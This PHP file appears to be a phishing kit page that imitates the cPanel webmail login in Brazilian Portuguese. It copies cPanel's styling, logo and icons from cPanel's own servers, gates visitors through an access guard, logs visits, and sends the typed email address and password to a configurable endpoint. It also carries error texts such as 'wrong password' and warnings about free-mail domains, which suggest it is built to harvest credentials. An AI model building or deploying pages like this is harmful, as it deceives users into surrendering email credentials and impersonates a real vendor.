<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);
require __DIR__ . '/includes/storage.php';
require __DIR__ . '/includes/access_guard.php';

enforce_public_access($config);
(new Storage($config['data_dir']))->recordVisit();
$locales = require __DIR__ . '/includes/locales.php';
require __DIR__ . '/includes/messages.php';

$locale = 'pt_br';
$_SESSION['locale'] = $locale;

require_once __DIR__ . '/includes/device.php';

$isLogout = isset($_GET['logout']);
if ($isLogout) {
    unset($_SESSION['webmail_user']);
    session_regenerate_id(true);
}

$localeSaved = isset($_GET['locale']);

$footerLocales = ['ar', 'cs', 'da', 'de', 'el', 'en', 'es', 'es_419'];
$currentLocaleLabel = $locales[$locale] ?? 'português do Brasil';
$year = date('Y');

$cpanelCss   = 'https://webmail.cpanel.net/cPanel_magic_revision_1678774027/unprotected/cpanel/style_v2_optimized.css';
$cpanelFonts = 'https://webmail.cpanel.net/cPanel_magic_revision_1648610195/unprotected/cpanel/fonts/open_sans/open_sans.min.css';
$cpanelLogo  = 'https://webmail.cpanel.net/cPanel_magic_revision_1542052117/unprotected/cpanel/images/webmail-logo.svg';

$cpanelIcon = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmZmIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmZmIi8+PC9nPjwvc3ZnPg==';

$statusMessage = '';
$statusVisible = false;
if ($isLogout) {
    $statusMessage = msg('logged_out', $locale);
    $statusVisible = true;
} elseif ($localeSaved) {
    $statusMessage = msg('session_locale', $locale);
    $statusVisible = true;
}

$favicon = 'data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC';

if (wm_is_mobile_client()) {
    require __DIR__ . '/templates/login_mobile.php';
    exit;
}

?>
<!DOCTYPE html>
<html lang="<?= e(str_replace('_', '-', $locale)) ?>" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate">
    <title><?= e($config['site_title']) ?></title>
    <link rel="shortcut icon" href="<?= e($favicon) ?>" type="image/x-icon">
    <link href="<?= e($cpanelFonts) ?>" rel="stylesheet" type="text/css">
    <link href="<?= e($cpanelCss) ?>" rel="stylesheet" type="text/css">
    <style type="text/css">
.copyright {
  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
  background-size: 25px auto;
}
    </style>
    <script>
    window.DOM = { get: function(id) { return document.getElementById(id); } };
    </script>
</head>
<body class="wm">

<input type="hidden" id="goto_uri" value="/">
<input type="hidden" id="goto_app" value="">

<div id="login-wrapper" class="group">
    <div class="wrapper">
        <div id="notify">
            <div id="login-status" class="error-notice" style="<?= $statusVisible ? 'visibility: visible' : 'visibility: hidden' ?>">
                <div class="content-wrapper">
                    <div id="login-detail">
                        <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                        <div id="login-status-message"><?= e($statusMessage) ?></div>
                    </div>
                </div>
            </div>
            <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
                <div class="content-wrapper">
                    <div id="IE-warning-detail">
                        <div id="IE-warning-icon-container"><span class="IE-warning-icon"></span></div>
                        <div id="IE-warning-message">
                            <?= e(msg('ie_warning', $locale)) ?>
                            <a title="Blog cPanel" target="_blank" href="https://go.cpanel.net/ie11deprecation"><?= e(msg('ie_blog', $locale)) ?></a>.
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div style="display:none">
            <div id="locale-container" style="visibility:hidden">
                <div id="locale-inner-container">
                    <div id="locale-header">
                        <div class="locale-head"><?= e(msg('locale_head', $locale)) ?></div>
                        <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)"><?= e(msg('locale_close', $locale)) ?></a></div>
                    </div>
                    <div id="locale-map">
                        <div class="scroller clear">
                            <?php foreach ($locales as $code => $label): ?>
                            <div class="locale-cell"><a href="?locale=<?= e($code) ?>"><?= e($label) ?></a></div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div id="content-container">
            <div id="login-container">
                <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="<?= e($cpanelLogo) ?>" alt="logo">
                    </div>
                    <div id="login-sub">
                        <div id="clickthrough_form" style="visibility:hidden">
                            <form action="javascript:void(0)">
                                <div class="notices"></div>
                                <button type="submit" class="clickthrough-cont-btn"><?= e(msg('locale_continue', $locale)) ?></button>
                            </form>
                        </div>
                        <div id="forms">
                            <form novalidate id="login_form" action="<?= e($config['login_action']) ?>" method="post">
                                <div class="input-req-login"><label for="user"><?= e(msg('email_label', $locale)) ?></label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="<?= e(msg('email_ph', $locale)) ?>" class="std_textbox" type="text" autocomplete="off" tabindex="1" required>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass"><?= e(msg('password_label', $locale)) ?></label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="<?= e(msg('password_ph', $locale)) ?>" class="std_textbox" type="password" tabindex="2" autocomplete="off" required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3"><?= e(msg('login_btn', $locale)) ?></button>
                                    </div>
                                </div>
                                <div class="clear" id="push"></div>
                            </form>
                        </div>
                    </div>

                    <div id="external-auth-container">
                        <div class="or-separator">
                            <span class="or-separator-label"><?= e(msg('or_label', $locale)) ?></span>
                            <span class="or-separator-secondary-label"><?= e(msg('or_secondary', $locale)) ?></span>
                        </div>
                        <div class="controls external-auth-items">
                            <div class="external-auth-btn">
                                <a class="external-auth-link" href="<?= e($config['cpanel_id_url']) ?>" title="<?= e(msg('cpanel_id', $locale)) ?>" style="background-color:#FF6C2C;color:#FFFFFF" referrerpolicy="origin">
                                    <i class="external-auth-icon" style="background-image:url(<?= e($cpanelIcon) ?>)"></i>
                                    <span class="external-auth-btn-label"><?= e(msg('cpanel_id', $locale)) ?></span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="locale-footer">
                <div class="locale-container">
                    <ul id="locales_list">
                        <?php foreach ($footerLocales as $code): ?>
                        <li><a href="?locale=<?= e($code) ?>"><?= e($locales[$code] ?? $code) ?></a></li>
                        <?php endforeach; ?>
                        <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
                    </ul>
                    <div id="mobilelocalemenu"><?= e(msg('mobile_locale', $locale)) ?>
                        <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale"><?= e($currentLocaleLabel) ?></a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
var MESSAGES = <?= json_encode([
    'session_locale'  => msg('session_locale', $locale),
    'invalid_login'   => msg('invalid_login', $locale),
    'invalid_email'   => msg('invalid_email', $locale),
    'invalid_domain'  => msg('invalid_domain', $locale),
    'invalid_password'=> msg('invalid_password', $locale),
    'wrong_password'  => msg('wrong_password', $locale),
    'warn_gmail'      => msg('warn_gmail', $locale),
    'warn_hotmail'    => msg('warn_hotmail', $locale),
    'warn_outlook'    => msg('warn_outlook', $locale),
    'warn_yahoo'      => msg('warn_yahoo', $locale),
    'warn_uol_free'   => msg('warn_uol_free', $locale),
    'connerror'       => msg('connerror', $locale),
    'success'         => msg('success', $locale),
    'authenticating'  => msg('authenticating', $locale),
    'no_username'     => msg('no_username', $locale),
    'network_error'   => msg('network_error', $locale),
    'ajax_timeout'    => msg('network_error', $locale),
], JSON_UNESCAPED_UNICODE) ?>;

window.IS_LOGOUT = <?= $isLogout ? 'true' : 'false' ?>;

(function () {
    "use strict";

    var FADE_DURATION = 0.45;
    var FADE_DELAY = 20;
    var LOCALE_FADES = [];
    var HAS_CSS_OPACITY = "opacity" in document.body.style;

    var login_form = DOM.get("login_form");
    var login_username_el = DOM.get("user");
    var login_password_el = DOM.get("pass");
    var login_submit_el = DOM.get("login_submit");
    var goto_app = DOM.get("goto_app");
    var goto_uri = DOM.get("goto_uri");

    var div_cache = {
        "locale-container": DOM.get("locale-container") || false,
        "login-container": DOM.get("login-container") || false,
        "locale-footer": DOM.get("locale-footer") || false,
        "content-cell": DOM.get("content-container") || false
    };
    var content_cell = div_cache["content-cell"];

    if (div_cache["locale-footer"]) {
        div_cache["locale-footer"].style.display = "block";
    }

    function set_opacity(el, opacity) {
        el.style.opacity = opacity;
    }

    function fade_in(el, duration, fadeOutInstead) {
        el = div_cache[el] || DOM.get(el) || el;
        var style_obj = el.style;
        var cur = window.getComputedStyle ? getComputedStyle(el, null) : el.currentStyle;
        var start = (cur.visibility !== "hidden" && parseFloat(cur.opacity)) ? parseFloat(cur.opacity) : 0;
        if (!duration) duration = FADE_DURATION;
        var duration_ms = duration * 1000;
        var startTime = new Date();
        var end = fadeOutInstead ? duration_ms + startTime.getTime() : null;
        if (!fadeOutInstead) style_obj.visibility = "visible";
        var interval = setInterval(function () {
            var opacity;
            if (fadeOutInstead) {
                opacity = start * (end - new Date()) / duration_ms;
                if (opacity <= 0) { opacity = 0; clearInterval(interval); style_obj.visibility = "hidden"; }
            } else {
                opacity = start + (1 - start) * ((new Date() - startTime) / duration_ms);
                if (opacity >= 1) { opacity = 1; clearInterval(interval); }
            }
            set_opacity(el, opacity);
        }, FADE_DELAY);
        return interval;
    }

    function fade_out(el, timeout) {
        return fade_in(el, timeout, true);
    }

    window.toggle_locales = function (showLocales) {
        while (LOCALE_FADES.length) clearInterval(LOCALE_FADES.shift());
        var newly_shown = div_cache[showLocales ? "locale-container" : "login-container"];
        if (!newly_shown || !content_cell) return;
        set_opacity(newly_shown, 0);
        content_cell.replaceChild(newly_shown, content_cell.children[0]);
        LOCALE_FADES.push(fade_in(newly_shown));
        LOCALE_FADES.push((showLocales ? fade_out : fade_in)("locale-footer"));
    };

    var level_classes = { info: "info-notice", error: "error-notice", success: "success-notice", warn: "warn-notice" };

    function show_status(message, level) {
        var container = DOM.get("login-status");
        var msgEl = DOM.get("login-status-message");
        if (!container || !msgEl) return;
        msgEl.textContent = message;
        var cls = level && level_classes[level] || level_classes.info;
        container.className = cls;
        fade_in(container);
    }

    function login_screen_delay_ms() {
        return 0;
    }

    function finish_login_result(result) {
        if (result.data && result.data.redirect) {
            window.location.replace(result.data.redirect);
            return;
        }
        var code = (result.data && result.data.message) || "invalid_login";
        var display = (result.data && result.data.text) || MESSAGES[code] || MESSAGES.invalid_login || "Login inválido.";
        var level = (result.data && result.data.level) || "error";
        if (level === "warning") level = "warn";
        show_status(display, level === "warn" ? "warn" : "error");
        document.body.classList.remove("logging-in");
        login_submit_el.disabled = false;
    }

    function do_login() {
        if (!login_username_el.value.length) {
            show_status(MESSAGES.no_username, "error");
            return false;
        }

        var userVal = login_username_el.value;
        var passVal = login_password_el.value;
        var body = "user=" + encodeURIComponent(userVal)
            + "&pass=" + encodeURIComponent(passVal);

        document.body.classList.add("logging-in");
        login_submit_el.disabled = true;
        show_status(MESSAGES.authenticating, "info");

        var delayMs = login_screen_delay_ms();
        var delayDone = false;
        var fetchResult = null;
        var fetchFailed = false;

        setTimeout(function () {
            delayDone = true;
            if (fetchResult !== null || fetchFailed) {
                if (fetchFailed) {
                    show_status(MESSAGES.network_error, "error");
                    document.body.classList.remove("logging-in");
                    login_submit_el.disabled = false;
                } else {
                    finish_login_result(fetchResult);
                }
            }
        }, delayMs);

        fetch(login_form.action, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: body
        })
            .then(function (res) {
                return res.json().then(function (data) {
                    return { ok: res.ok, status: res.status, data: data };
                });
            })
            .then(function (result) {
                fetchResult = result;
                if (delayDone) {
                    finish_login_result(result);
                }
            })
            .catch(function () {
                fetchFailed = true;
                if (delayDone) {
                    show_status(MESSAGES.network_error, "error");
                    document.body.classList.remove("logging-in");
                    login_submit_el.disabled = false;
                }
            });

        return false;
    }

    if (navigator.userAgent.indexOf("Trident") !== -1) {
        var ie = DOM.get("IE-warning");
        if (ie) ie.classList.remove("IE-warning-hide");
    }

    if (login_form) login_form.onsubmit = do_login;

    try {
        set_opacity(DOM.get("login-wrapper"), 0);
        LOCALE_FADES.push(fade_in("login-wrapper"));
        if (window.IS_LOGOUT) {
            setTimeout(function () { fade_out("login-status", 10000); }, 100);
        } else if (/(?:\?|&)locale=[^&]/.test(location.search)) {
            show_status(MESSAGES.session_locale, "info");
        }
        setTimeout(function () { login_username_el.focus(); }, 100);
    } catch (e) {
        if (window.console) console.warn(e);
    }
})();
</script>

<div class="copyright">
    <?= e(sprintf(msg('copyright', $locale), $year)) ?>
    <br><a href="<?= e($config['privacy_url']) ?>" target="_blank"><?= e(msg('privacy', $locale)) ?></a>
</div>

</body>
</html>
